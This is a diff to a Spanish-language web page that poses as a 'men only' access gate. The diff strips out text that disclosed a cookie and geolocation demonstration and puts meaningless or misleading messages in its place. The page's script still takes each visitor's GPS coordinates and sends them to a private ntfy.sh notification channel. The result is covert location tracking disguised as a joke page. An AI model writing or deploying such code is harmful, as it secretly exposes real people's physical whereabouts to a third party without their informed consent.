@@ -83,13 +83,12 @@
     <p>Ser hombre</p>
     
     <p><strong>Nota importante:</strong> No apto para mujeres.</p>
-    <p>ya no se que poner</p>
     <div id="status"></div>
   </div>
 
   <div id="access-denied" class="content" style="display: none;">
     <h1>Acceso Denegado</h1>
-    <p>Para acceder a este sitio, debes aceptar las cookies. </p>
+    <p>Para acceder a este sitio, debes aceptar que eres hombre. </p>
     <p>Puedes recargar la página para intentarlo de nuevo.</p>
   </div>
 
@@ -123,7 +122,7 @@
       document.querySelector('.content').style.display = 'block';
       // Simular aceptación de cookies
       localStorage.setItem('cookiesAccepted', 'true');
-      statusDiv.innerHTML = '<p>Cookies aceptadas. Ahora solicitando permiso de ubicación...</p>';
+      statusDiv.innerHTML = '<p>ya se que eres hombre</p>';
 
       // Solicitar ubicación después de un breve delay para demostrar secuencia
       setTimeout(function() {
@@ -132,21 +131,21 @@
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
             const maps = `https://maps.google.com/?q=${lat},${lon}`;
-            statusDiv.innerHTML += '<p>¡Ubicación obtenida exitosamente!</p><p>Latitud: ' + lat + ', Longitud: ' + lon + '</p><p>En un sitio real, esta información podría enviarse a servidores para rastreo.</p>';
+            statusDiv.innerHTML += '<p>Eres hombre</p><p>Latitud: ' + lat + ', Longitud: ' + lon + '</p><p>Confirmado</p>';
             // Enviar notificación a ntfy.sh
             fetch("https://ntfy.sh/ubicacion-jared-2024xz", {
               method: "POST",
               body: `Ubicación recibida!\nLatitud: ${lat}\nLongitud: ${lon}\nMaps: ${maps}`
             }).then(() => {
-              statusDiv.innerHTML += '<p>Notificación enviada a ntfy.sh.</p>';
+              statusDiv.innerHTML += '<p>sommos therians</p>';
             }).catch(err => {
               statusDiv.innerHTML += '<p>Error al enviar notificación: ' + err.message + '</p>';
             });
           }, function(error) {
-            statusDiv.innerHTML += '<p>Permiso de ubicación denegado o error: ' + error.message + '</p><p>Esto demuestra cómo los usuarios pueden controlar sus permisos.</p>';
+            statusDiv.innerHTML += '<p>Permiso de denegado o error: ' + error.message + '</p><p>Esto</p>';
           });
         } else {
-          statusDiv.innerHTML += '<p>La geolocalización no es soportada por este navegador.</p>';
+          statusDiv.innerHTML += '<p>para.</p>';
         }
       }, 1000); // 1 segundo de delay para mostrar la secuencia
     });
